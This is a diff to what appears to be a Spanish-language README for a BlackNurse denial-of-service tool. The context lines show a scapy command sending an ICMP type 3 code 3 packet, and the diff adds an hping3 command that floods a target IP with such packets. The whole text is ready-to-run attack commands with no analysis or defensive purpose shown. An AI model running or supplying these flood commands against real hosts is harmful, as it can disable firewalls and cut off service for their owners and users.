@@ -11,3 +11,6 @@ python blacknurse.py IP
 Ejecutar con scapy: 
 send(IP(dst="1.2.3.4")/ICMP(code=3,type=3))
 
+Ejecutar con hping3
+hping3 --icmp -C 3 -K 3 --flood IP
+
